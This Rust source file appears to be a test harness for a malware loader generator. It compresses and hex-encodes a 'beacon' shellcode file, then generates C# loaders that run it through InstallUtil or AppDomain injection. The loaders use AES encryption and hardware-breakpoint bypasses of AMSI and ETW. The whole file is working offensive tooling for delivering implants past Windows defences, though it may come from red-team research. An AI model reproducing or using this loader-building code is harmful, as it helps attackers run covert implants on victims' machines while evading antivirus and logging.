use std::fs;
use std::io::Write;
use template_engine::*;
use flate2::write::DeflateEncoder;
use flate2::Compression;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let beacon = fs::read("/Users/salma/Documents/Research/DefCrow/beacon_x64.bin")?;
    println!("Raw beacon:       {} bytes", beacon.len());

    let mut enc = DeflateEncoder::new(Vec::with_capacity(beacon.len()), Compression::best());
    enc.write_all(&beacon)?;
    let compressed = enc.finish()?;
    println!("Deflated beacon:  {} bytes ({:+}%)", compressed.len(),
        ((compressed.len() as isize - beacon.len() as isize) * 100 / beacon.len() as isize));

    for (name, lt) in &[
        ("InstallUtil", LoaderType::InstallUtil),
        ("AppDomain",   LoaderType::AppDomain),
    ] {
        let sc_hex: String = compressed.iter().map(|b| format!("{:02x}", b)).collect();
        let cfg = LoaderConfig {
            loader_type: *lt,
            features: vec![Feature::AmsiHwbp, Feature::EtwHwbp, Feature::Compress],
            encryption: Encryption::Aes256,
            shellcode_hex: sc_hex,
            key_hex: "deadbeef".repeat(8),
            iv_hex:  "feedface".repeat(4),
            pe_config: None,
            appdomain_config: if *lt == LoaderType::AppDomain {
                Some(AppDomainConfig {
                    clr_version: "v4.0.30319".into(),
                    net_version: "4.0".into(),
                    assembly_name: "TLoader".into(),
                    type_name: "EvilT".into(),
                    namespace: "EvilN".into(),
                })
            } else { None },
            wsf_stub_config: None,
            dotnet_stub_hex: None,
            staged: None,
        };
        let src = generate_csharp_source(&cfg)?;
        let path = format!("/tmp/beacon_test_full/{}_compressed.cs", name.to_lowercase());
        fs::write(&path, &src)?;
        let has_deflate = src.contains("DeflateStream");
        let has_compress = src.contains("CompressionMode.Decompress");
        println!("  {:12} {} bytes — DeflateStream:{} CompressionMode:{}",
                 name, src.len(), has_deflate, has_compress);
    }
    Ok(())
}
